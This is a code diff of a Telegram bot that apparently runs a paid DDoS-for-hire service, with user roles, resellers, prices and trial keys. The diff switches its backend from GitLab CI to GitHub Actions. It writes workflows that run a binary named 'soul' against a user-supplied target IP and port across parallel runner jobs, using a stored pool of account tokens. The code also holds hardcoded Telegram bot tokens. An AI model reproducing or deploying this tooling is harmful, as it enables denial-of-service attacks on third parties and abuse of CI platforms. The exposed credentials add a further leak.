@@ -1,4 +1,4 @@
-
+#pip install python-telegram-bot PyGithub
 import os
 import json
 import logging
@@ -9,8 +9,8 @@ import string
 from datetime import datetime, timedelta
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
-import gitlab
-from gitlab.exceptions import GitlabError, GitlabAuthenticationError, GitlabGetError
+from github import Github, GithubException
+
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -18,11 +18,10 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "7952634181:AAFtvSN6vrzJzfuwrejQxVqEIqD4lMC9wv8"
-YML_FILE_PATH = ".gitlab-ci.yml"
+BOT_TOKEN = "6878046471:AAGEwxX9NIV6CRF1_xpqGwHGaEKREPRKXPM"
+YML_FILE_PATH = ".github/workflows/main.yml"
 BINARY_FILE_NAME = "soul"
-ADMIN_IDS = [1600832237,1600832237]
-TARGET_PROJECT_NAME = "soulcrack-worker"  # NEW: Name of project to auto-create
+ADMIN_IDS = [5826548994, 1718738219]
 
 # Conversation states
 WAITING_FOR_BINARY = 1
@@ -43,7 +42,6 @@ WAITING_FOR_RESELLER_ADD_USERNAME = 19
 WAITING_FOR_RESELLER_REMOVE_ID = 20
 WAITING_FOR_TOKEN_ADD = 21
 WAITING_FOR_TOKEN_REMOVE = 22
-WAITING_FOR_TOKEN_FILE = 23  # NEW: State for token file upload
 
 # Attack management
 current_attack = None
@@ -72,6 +70,7 @@ RESELLER_PRICES = {
     "4": 400,
     "7": 550
 }
+
 
 def load_users():
     try:
@@ -166,15 +165,15 @@ def save_resellers(resellers):
     with open('resellers.json', 'w') as f:
         json.dump(resellers, f, indent=2)
 
-def load_gitlab_tokens():
+def load_github_tokens():
     try:
-        with open('gitlab_tokens.json', 'r') as f:
+        with open('github_tokens.json', 'r') as f:
             return json.load(f)
     except FileNotFoundError:
         return []
 
-def save_gitlab_tokens(tokens):
-    with open('gitlab_tokens.json', 'w') as f:
+def save_github_tokens(tokens):
+    with open('github_tokens.json', 'w') as f:
         json.dump(tokens, f, indent=2)
 
 def load_attack_state():
@@ -258,7 +257,7 @@ owners = load_owners()
 admins = load_admins()
 groups = load_groups()
 resellers = load_resellers()
-gitlab_tokens = load_gitlab_tokens()
+github_tokens = load_github_tokens()
 MAINTENANCE_MODE = load_maintenance_mode()
 COOLDOWN_DURATION = load_cooldown()
 MAX_ATTACKS = load_max_attacks()
@@ -268,6 +267,7 @@ trial_keys = load_trial_keys()
 attack_state = load_attack_state()
 current_attack = attack_state.get("current_attack")
 cooldown_until = attack_state.get("cooldown_until", 0)
+
 
 def is_primary_owner(user_id):
     user_id_str = str(user_id)
@@ -305,20 +305,20 @@ def can_start_attack(user_id):
     global current_attack, cooldown_until
 
     if MAINTENANCE_MODE:
-        return False, "⚠️ **MAINTENANCE MODE**\n━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance. Please wait."
+        return False, "⚠️ **MAINTENANCE MODE**\n━━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance. Please wait."
 
     user_id_str = str(user_id)
     current_count = user_attack_counts.get(user_id_str, 0)
     if current_count >= MAX_ATTACKS:
-        return False, f"⚠️ **MAXIMUM ATTACK LIMIT REACHED**\n━━━━━━━━━━━━━━━━━━━━━\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."
+        return False, f"⚠️ **MAXIMUM ATTACK LIMIT REACHED**\n━━━━━━━━━━━━━━━━━━━━━━\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."
 
     if current_attack is not None:
-        return False, "⚠️ **ERROR: ATTACK ALREADY RUNNING**\n━━━━━━━━━━━━━━━━━━━━━\nPlease wait until the current attack finishes."
+        return False, "⚠️ **ERROR: ATTACK ALREADY RUNNING**\n━━━━━━━━━━━━━━━━━━━━━━\nPlease wait until the current attack finishes."
 
     current_time = time.time()
     if current_time < cooldown_until:
         remaining_time = int(cooldown_until - current_time)
-        return False, f"⏳ **COOLDOWN REMAINING**\n━━━━━━━━━━━━━━━━━━━━━\nPlease wait {remaining_time} seconds before starting new attack."
+        return False, f"⏳ **COOLDOWN REMAINING**\n━━━━━━━━━━━━━━━━━━━━━━\nPlease wait {remaining_time} seconds before starting new attack."
 
     return True, "✅ Ready to start attack"
 
@@ -387,6 +387,7 @@ def get_attack_status():
 
     return {"status": "ready"}
 
+
 def generate_trial_key(hours):
     key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
     expiry = time.time() + (hours * 3600)
@@ -436,295 +437,151 @@ def redeem_trial_key(key, user_id):
 
     return True, f"✅ Trial access activated for {key_data['hours']} hours!"
 
-# ==================== NEW FUNCTIONS FOR GROUP-BASED ARCHITECTURE ====================
 
-def find_or_create_project_in_group(token, group_id, project_name=TARGET_PROJECT_NAME):
-    """
-    Find or create a project within a GitLab group.
-    
-    Args:
-        token: GitLab API token
-        group_id: GitLab group ID
-        project_name: Name of project to find or create (default: soul-worker)
-        
-    Returns:
-        tuple: (project_object, was_created_bool, error_message)
-    """
+def create_repository(token, repo_name="soulcrack-tg"):
     try:
-        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-        gl.auth()
-        
-        # Get the group
+        g = Github(token)
+        user = g.get_user()
+
         try:
-            group = gl.groups.get(group_id)
-        except GitlabGetError:
-            return None, False, f"Group ID {group_id} not found or no access"
-        
-        # List all projects in the group
-        projects = group.projects.list(all=True)
-        
-        # Search for existing project with the target name
-        for project in projects:
-            if project.name.lower() == project_name.lower():
-                # Found existing project, get full project object
-                full_project = gl.projects.get(project.id)
-                logger.info(f"✅ Found existing project '{project_name}' (ID: {project.id}) in group {group_id}")
-                return full_project, False, None
-        
-        # Project doesn't exist, create it
-        try:
-            new_project = gl.projects.create({
-                'name': project_name,
-                'namespace_id': group_id,
-                'visibility': 'private',
-                'initialize_with_readme': True
-            })
-            logger.info(f"✅ Created new project '{project_name}' (ID: {new_project.id}) in group {group_id}")
-            return new_project, True, None
-        except Exception as e:
-            return None, False, f"Failed to create project: {str(e)}"
-            
-    except GitlabAuthenticationError:
-        return None, False, "Failed to authenticate with GitLab token"
+            repo = user.get_repo(repo_name)
+            return repo, False
+        except GithubException:
+            repo = user.create_repo(
+                repo_name,
+                description="soulcrack Bot Repository",
+                private=False,
+                auto_init=False
+            )
+            return repo, True
     except Exception as e:
-        return None, False, f"Error: {str(e)}"
+        raise Exception(f"Failed to create repository: {e}")
 
-def get_target_project_from_group(token, group_id, preferred_name="Lumen"):
-    """
-    Get target project from a group. Looks for preferred name first, then soul-worker, then first available.
-    
-    Args:
-        token: GitLab API token
-        group_id: GitLab group ID
-        preferred_name: Preferred project name (default: "Lumen")
-        
-    Returns:
-        tuple: (project_object, project_name, error_message)
-    """
-    try:
-        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-        gl.auth()
-        
-        # Get the group
-        try:
-            group = gl.groups.get(group_id)
-        except GitlabGetError:
-            return None, None, f"Group ID {group_id} not found"
-        
-        # List all projects in the group
-        projects = group.projects.list(all=True)
-        
-        if not projects:
-            return None, None, "No projects found in group"
-        
-        # Priority 1: Look for preferred name (e.g., "Lumen")
-        for project in projects:
-            if project.name.lower() == preferred_name.lower():
-                full_project = gl.projects.get(project.id)
-                return full_project, project.name, None
-        
-        # Priority 2: Look for "soul-worker"
-        for project in projects:
-            if project.name.lower() == TARGET_PROJECT_NAME.lower():
-                full_project = gl.projects.get(project.id)
-                return full_project, project.name, None
-        
-        # Priority 3: Use first available project
-        first_project = gl.projects.get(projects[0].id)
-        return first_project, projects[0].name, None
-        
-    except Exception as e:
-        return None, None, f"Error: {str(e)}"
+def update_yml_file(token, repo_name, ip, port, time_val, method):
+    yml_content = f"""name: soulcrack fucker
+on: [push]
 
-def setup_group_automatically(token, group_id, binary_content=None):
-    """
-    Automatically setup a group with soul-worker project, binary, and CI/CD.
-    
-    Args:
-        token: GitLab API token
-        group_id: GitLab group ID
-        binary_content: Binary file content (optional, will try to load from file if not provided)
-        
-    Returns:
-        tuple: (success, project_id, message)
-    """
-    try:
-        # Step 1: Find or create soul-worker project
-        project, was_created, error = find_or_create_project_in_group(token, group_id, TARGET_PROJECT_NAME)
-        
-        if project is None:
-            return False, None, f"Failed to setup project: {error}"
-        
-        project_id = project.id
-        
-        # Step 2: Upload binary file if available
-        if binary_content is None:
-            if os.path.exists(BINARY_FILE_NAME):
-                with open(BINARY_FILE_NAME, 'rb') as f:
-                    binary_content = f.read()
-        
-        if binary_content:
-            success, msg = upload_binary_to_single_project(token, project_id, binary_content)
-            if not success:
-                logger.warning(f"⚠️ Binary upload failed: {msg}")
-        
-        status = "created and configured" if was_created else "found and configured"
-        return True, project_id, f"Project '{TARGET_PROJECT_NAME}' {status} successfully"
-        
-    except Exception as e:
-        return False, None, f"Setup failed: {str(e)}"
+jobs:
 
-def update_yml_file(token, group_id, ip, port, time_val, method):
-    """
-    Create/update .gitlab-ci.yml file with GitLab CI syntax.
-    NOW USES GROUP-BASED LOOKUP.
-    """
-    # Get target project from group
-    project, project_name, error = get_target_project_from_group(token, group_id)
-    
-    if project is None:
-        logger.error(f"❌ Failed to get project from group {group_id}: {error}")
-        return False
-    
-    project_id = project.id
-    
-    yml_content = f"""stages:
-  - first_batch
+  stage-0:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {ip} {port} 10 999
 
-run_single_attack:
-  stage: first_batch
-  parallel: 30  # Set to 1 to run only one job
-  image: ubuntu:22.04
-  script:
-    - echo "Running single attack job"
-    - chmod +x ./soul
-    - ./soul {ip} {port} {time_val} 999
+  stage-1:
+    needs: stage-0
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {ip} {port} {time_val} 999
+
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
+    steps:
+      - id: calc
+        run: |
+          
+          NUM_JOBS=$(({time_val} / 10))
+          
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Sequential 10s Burst
+        run: |
+          chmod +x soul
+          ./soul {ip} {port} 10 999
 """
 
     try:
-        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-        gl.auth()
-        project = gl.projects.get(project_id)
+        g = Github(token)
+        repo = g.get_repo(repo_name)
 
         try:
-            # Try to get existing file
-            file = project.files.get(file_path=YML_FILE_PATH, ref='main')
-            # Update existing file
-            file.content = yml_content
-            file.save(branch='main', commit_message=f"Update attack parameters - {ip}:{port} ({method})")
-            logger.info(f"✅ Updated .gitlab-ci.yml for project {project_name} (ID: {project_id})")
-        except GitlabGetError:
-            # Create new file
-            project.files.create({
-                'file_path': YML_FILE_PATH,
-                'branch': 'main',
-                'content': yml_content,
-                'commit_message': f"Create attack parameters - {ip}:{port} ({method})"
-            })
-            logger.info(f"✅ Created .gitlab-ci.yml for project {project_name} (ID: {project_id})")
-
-        # Trigger pipeline
-        pipeline = project.pipelines.create({'ref': 'main'})
-        logger.info(f"✅ Triggered pipeline {pipeline.id} for project {project_name} (ID: {project_id})")
+            file_content = repo.get_contents(YML_FILE_PATH)
+            repo.update_file(
+                YML_FILE_PATH,
+                f"Update attack parameters - {ip}:{port} ({method})",
+                yml_content,
+                file_content.sha
+            )
+            logger.info(f"✅ Updated configuration for {repo_name}")
+        except:
+            repo.create_file(
+                YML_FILE_PATH,
+                f"Create attack parameters - {ip}:{port} ({method})",
+                yml_content
+            )
+            logger.info(f"✅ Created configuration for {repo_name}")
 
         return True
     except Exception as e:
-        logger.error(f"❌ Error for project {project_name} in group {group_id}: {e}")
+        logger.error(f"❌ Error for {repo_name}: {e}")
         return False
 
-def instant_stop_all_jobs(token, group_id):
-    """
-    Stop all running, pending, or created pipelines in GitLab group projects.
-    NOW USES GROUP-BASED LOOKUP.
-    """
+def instant_stop_all_jobs(token, repo_name):
     try:
-        # Get target project from group
-        project, project_name, error = get_target_project_from_group(token, group_id)
-        
-        if project is None:
-            logger.error(f"❌ Failed to get project from group {group_id}: {error}")
-            return 0
-        
-        project_id = project.id
+        g = Github(token)
+        repo = g.get_repo(repo_name)
 
-        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-        gl.auth()
-        project = gl.projects.get(project_id)
-
-        statuses_to_cancel = ['running', 'pending', 'created']
+        running_statuses = ['queued', 'in_progress', 'pending']
         total_cancelled = 0
 
-        for status in statuses_to_cancel:
+        for status in running_statuses:
             try:
-                pipelines = project.pipelines.list(status=status, per_page=100)
-                for pipeline in pipelines:
+                workflows = repo.get_workflow_runs(status=status)
+                for workflow in workflows:
                     try:
-                        pipeline.cancel()
+                        workflow.cancel()
                         total_cancelled += 1
-                        logger.info(f"✅ INSTANT STOP: Cancelled {status} pipeline {pipeline.id} for project {project_name}")
+                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                     except Exception as e:
-                        logger.error(f"❌ Error cancelling pipeline {pipeline.id}: {e}")
+                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
             except Exception as e:
-                logger.error(f"❌ Error getting {status} pipelines: {e}")
+                logger.error(f"❌ Error getting {status} workflows: {e}")
 
         return total_cancelled
 
     except Exception as e:
-        logger.error(f"❌ Error accessing group {group_id}: {e}")
+        logger.error(f"❌ Error accessing {repo_name}: {e}")
         return 0
 
-def upload_binary_to_single_project(token, project_id, binary_content):
-    """
-    Helper function to upload the 'soul' binary file to a single GitLab project.
-    Returns (success: bool, message: str)
-    """
-    try:
-        import base64
 
-        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-        gl.auth()
-        project = gl.projects.get(project_id)
 
-        # Encode binary content as base64 for GitLab API
-        encoded_content = base64.b64encode(binary_content).decode('utf-8')
-
-        try:
-            # Try to get existing file
-            file = project.files.get(file_path=BINARY_FILE_NAME, ref='main')
-            # Update existing file
-            file.content = encoded_content
-            file.encoding = 'base64'
-            file.save(branch='main', commit_message="Auto-upload binary file")
-            return True, "Binary file updated successfully"
-        except GitlabGetError:
-            # Create new file
-            project.files.create({
-                'file_path': BINARY_FILE_NAME,
-                'branch': 'main',
-                'content': encoded_content,
-                'encoding': 'base64',
-                'commit_message': "Auto-upload binary file"
-            })
-            return True, "Binary file uploaded successfully"
-
-    except Exception as e:
-        return False, f"Failed to upload binary: {str(e)}"
-
-# ==================== KEYBOARD GENERATORS ====================
 
 def get_main_keyboard(user_id):
     """Generate main keyboard based on user role"""
     keyboard = []
 
-    # Common buttons for all authorized users
-    keyboard.append([KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")])
-    keyboard.append([KeyboardButton("🛑 Stop Attack"), KeyboardButton("📋 My Access")])
+    
 
-    # Admin and Owner buttons
+    keyboard.append([KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")])
+    keyboard.append([KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")])
+
+   
     if is_owner(user_id) or is_admin(user_id):
         keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
 
-    # Owner-only buttons
+ 
     if is_owner(user_id):
         keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
 
@@ -763,11 +620,10 @@ def get_bot_settings_keyboard():
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 def get_token_management_keyboard():
-    """Token management keyboard - NOW WITH UPLOAD TOKEN FILE OPTION"""
+    """Token management keyboard"""
     keyboard = [
         [KeyboardButton("➕ Add Token"), KeyboardButton("📋 List Tokens")],
         [KeyboardButton("🗑️ Remove Token"), KeyboardButton("🧹 Remove Expired")],
-        [KeyboardButton("📤 Upload Token File")],  # NEW BUTTON
         [KeyboardButton("« Back to Main Menu")]
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
@@ -777,7 +633,8 @@ def get_cancel_keyboard():
     keyboard = [[KeyboardButton("❌ Cancel")]]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-# ==================== START COMMAND ====================
+
+
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -785,7 +642,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
         await update.message.reply_text(
             "🔧 **MAINTENANCE MODE**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Bot is under maintenance.\n"
             "Please wait until it's back."
         )
@@ -810,14 +667,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 try:
                     await context.bot.send_message(
                         chat_id=int(owner_id),
-                        text=f"🔥 **NEW ACCESS REQUEST**\n━━━━━━━━━━━━━━━━━━━━━\nUser: @{update.effective_user.username or 'No username'}\nID: `{user_id}`\nUse User Management to approve"
+                        text=f"📥 **NEW ACCESS REQUEST**\n━━━━━━━━━━━━━━━━━━━━━━\nUser: @{update.effective_user.username or 'No username'}\nID: `{user_id}`\nUse User Management to approve"
                     )
                 except:
                     pass
 
         await update.message.reply_text(
             "📋 **ACCESS REQUEST SENT**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Your access request has been sent to admin.\n"
             "Please wait for approval.\n\n"
             f"Your User ID: `{user_id}`\n\n"
@@ -826,7 +683,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Get user role
+    
     if is_owner(user_id):
         if is_primary_owner(user_id):
             user_role = "👑 PRIMARY OWNER"
@@ -854,9 +711,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     message = (
         f"🤖 **WELCOME TO THE BOT** 🤖\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"{user_role}\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"🎯 **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
         f"📊 **Status:** {'🟢 Ready' if attack_status['status'] == 'ready' else '🔴 Busy'}"
         f"{status_text}\n\n"
@@ -866,27 +723,28 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = get_main_keyboard(user_id)
     await update.message.reply_text(message, reply_markup=reply_markup)
 
-# ==================== MESSAGE HANDLERS ====================
+
+
 
 async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
 
-    # Main Menu
+    
     if text == "« Back to Main Menu":
         await show_main_menu(update, user_id)
 
-    # Attack operations
+    
     elif text == "🎯 Launch Attack":
         await launch_attack_start(update, context, user_id)
     elif text == "📊 Check Status":
         await check_status(update, user_id)
     elif text == "🛑 Stop Attack":
         await stop_attack_handler(update, context, user_id)
-    elif text == "📋 My Access":
+    elif text == "🔐 My Access":
         await my_access(update, user_id)
 
-    # User Management
+
     elif text == "👥 User Management":
         await show_user_management(update, user_id)
     elif text == "➕ Add User":
@@ -902,7 +760,7 @@ async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE
     elif text == "💰 Price List":
         await price_list(update)
 
-    # Bot Settings
+    
     elif text == "⚙️ Bot Settings":
         await show_bot_settings(update, user_id)
     elif text == "🔧 Toggle Maintenance":
@@ -914,7 +772,7 @@ async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE
     elif text == "📋 Admin List":
         await admin_list(update, user_id)
 
-    # Owner Panel
+   
     elif text == "👑 Owner Panel":
         await show_owner_panel(update, user_id)
     elif text == "👑 Add Owner":
@@ -934,7 +792,7 @@ async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE
     elif text == "📤 Upload Binary":
         await upload_binary_start(update, user_id)
 
-    # Token Management
+  
     elif text == "🔑 Token Management":
         await show_token_management(update, user_id)
     elif text == "➕ Add Token":
@@ -945,14 +803,12 @@ async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE
         await remove_token_start(update, user_id)
     elif text == "🧹 Remove Expired":
         await remove_expired_tokens(update, user_id)
-    elif text == "📤 Upload Token File":  # NEW HANDLER
-        await upload_token_file_start(update, user_id)
 
-    # Help
+    
     elif text == "❓ Help":
         await help_handler(update, user_id)
 
-    # Cancel
+   
     elif text == "❌ Cancel":
         # Clear temp data
         if user_id in temp_data:
@@ -960,11 +816,11 @@ async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE
         reply_markup = get_main_keyboard(user_id)
         await update.message.reply_text("❌ **OPERATION CANCELLED**", reply_markup=reply_markup)
 
-    # Handle multi-step input
+   
     else:
         await handle_text_input(update, context, user_id, text)
 
-# ==================== MENU HANDLERS ====================
+
 
 async def show_main_menu(update: Update, user_id):
     if is_owner(user_id):
@@ -994,9 +850,9 @@ async def show_main_menu(update: Update, user_id):
 
     message = (
         f"🤖 **MAIN MENU** 🤖\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"{user_role}\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"🎯 **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
         f"📊 **Status:** {'🟢 Ready' if attack_status['status'] == 'ready' else '🔴 Busy'}"
         f"{status_text}\n\n"
@@ -1013,7 +869,7 @@ async def show_user_management(update: Update, user_id):
 
     message = (
         "👥 **USER MANAGEMENT**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
         "Manage users, approvals, and trial keys\n\n"
         "Select an option below:"
     )
@@ -1028,7 +884,7 @@ async def show_bot_settings(update: Update, user_id):
 
     message = (
         "⚙️ **BOT SETTINGS**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}\n"
         f"⏱️ Cooldown: {COOLDOWN_DURATION}s\n"
         f"🎯 Max Attacks: {MAX_ATTACKS}\n\n"
@@ -1045,7 +901,7 @@ async def show_owner_panel(update: Update, user_id):
 
     message = (
         "👑 **OWNER PANEL**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
         "Owner-only management options\n\n"
         "Select an option below:"
     )
@@ -1060,15 +916,16 @@ async def show_token_management(update: Update, user_id):
 
     message = (
         "🔑 **TOKEN MANAGEMENT**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Total Groups: {len(gitlab_tokens)}\n\n"  # Changed "Servers" to "Groups"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Total Servers: {len(github_tokens)}\n\n"
         "Select an option below:"
     )
 
     reply_markup = get_token_management_keyboard()
     await update.message.reply_text(message, reply_markup=reply_markup)
 
-# ==================== ATTACK HANDLERS ====================
+
+
 
 async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
     if not can_user_attack(user_id):
@@ -1080,7 +937,7 @@ async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text(message)
         return
 
-    if not gitlab_tokens:
+    if not github_tokens:
         await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers available. Contact admin.")
         return
 
@@ -1088,7 +945,7 @@ async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE
     reply_markup = get_cancel_keyboard()
     await update.message.reply_text(
         "🎯 **LAUNCH ATTACK - STEP 1/3**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
         "Please send the target IP address:\n\n"
         "Example: `192.168.1.1`\n\n"
         "⚠️ IPs starting with '15' or '96' are not allowed",
@@ -1106,7 +963,7 @@ async def check_status(update: Update, user_id):
         attack = attack_status["attack"]
         message = (
             "🔥 **ATTACK RUNNING**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🌐 Target: `{attack['ip']}:{attack['port']}`\n"
             f"⏱️ Elapsed: `{attack_status['elapsed']}s`\n"
             f"⏳ Remaining: `{attack_status['remaining']}s`\n"
@@ -1115,14 +972,14 @@ async def check_status(update: Update, user_id):
     elif attack_status["status"] == "cooldown":
         message = (
             "⏳ **COOLDOWN**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"⏳ Remaining: `{attack_status['remaining_cooldown']}s`\n"
             f"⏰ Next attack in: `{attack_status['remaining_cooldown']}s`"
         )
     else:
         message = (
             "✅ **READY**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             "No attack running.\n"
             "You can start a new attack."
         )
@@ -1140,7 +997,7 @@ async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("❌ **NO ACTIVE ATTACK**\nNo attack is running.")
         return
 
-    if not gitlab_tokens:
+    if not github_tokens:
         await update.message.reply_text("❌ **NO SERVERS AVAILABLE**")
         return
 
@@ -1156,13 +1013,13 @@ async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         try:
             stopped = instant_stop_all_jobs(
                 token_data['token'],
-                token_data['group_id']  # Changed from project_id to group_id
+                token_data['repo']
             )
-            results.append((token_data.get('group_name', f"Group {token_data['group_id']}"), stopped))
+            results.append((token_data['username'], stopped))
         except Exception as e:
-            results.append((token_data.get('group_name', f"Group {token_data['group_id']}"), 0))
+            results.append((token_data['username'], 0))
 
-    for token_data in gitlab_tokens:
+    for token_data in github_tokens:
         thread = threading.Thread(target=stop_single_token, args=(token_data,))
         threads.append(thread)
         thread.start()
@@ -1170,7 +1027,7 @@ async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     for thread in threads:
         thread.join()
 
-    for group_name, stopped in results:
+    for username, stopped in results:
         total_stopped += stopped
         if stopped > 0:
             success_count += 1
@@ -1179,9 +1036,9 @@ async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     message = (
         f"🛑 **ATTACK STOPPED**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"✅ Pipelines cancelled: {total_stopped}\n"
-        f"✅ Groups: {success_count}/{len(gitlab_tokens)}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Workflows cancelled: {total_stopped}\n"
+        f"✅ Servers: {success_count}/{len(github_tokens)}\n"
         f"⏳ Cooldown: {COOLDOWN_DURATION}s"
     )
 
@@ -1234,167 +1091,21 @@ async def my_access(update: Update, user_id):
     remaining_attacks = MAX_ATTACKS - current_attacks
 
     message = (
-        f"📋 **YOUR ACCESS INFO**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 Role: {role}\n"
-        f"🎯 Attacks Used: {current_attacks}/{MAX_ATTACKS}\n"
-        f"🎯 Remaining: {remaining_attacks}\n"
-        f"📅 Expiry: {expiry}\n"
-        f"🆔 Your ID: `{user_id}`"
+        f"🔐 **YOUR ACCESS INFO**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"• **Role:** {role}\n"
+        f"• **User ID:** `{user_id}`\n"
+        f"• **Username:** @{update.effective_user.username or 'No username'}\n"
+        f"• **Expiry:** {expiry}\n"
+        f"• **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"**Attack Access:** {'✅ Yes' if can_user_attack(user_id) else '❌ No'}"
     )
 
     await update.message.reply_text(message)
 
-# ==================== TOKEN MANAGEMENT HANDLERS ====================
 
-async def add_token_start(update: Update, user_id):
-    """Modified to use group_id instead of project_id"""
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
-        return
 
-    temp_data[user_id] = {"step": "token_add"}
-    reply_markup = get_cancel_keyboard()
-    await update.message.reply_text(
-        "➕ **ADD TOKEN**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send token and group ID in format:\n"
-        "`token,group_id`\n\n"
-        "Example:\n"
-        "`glpat-xxxxxxxxxxxxxxxxxxxx,12345678`\n\n"
-        "⚡ The bot will automatically:\n"
-        "• Find or create 'soul-worker' project\n"
-        "• Upload binary file\n"
-        "• Setup CI/CD configuration",
-        reply_markup=reply_markup
-    )
-
-async def upload_token_file_start(update: Update, user_id):
-    """NEW FUNCTION: Start bulk token upload from file"""
-    if not is_owner(user_id):
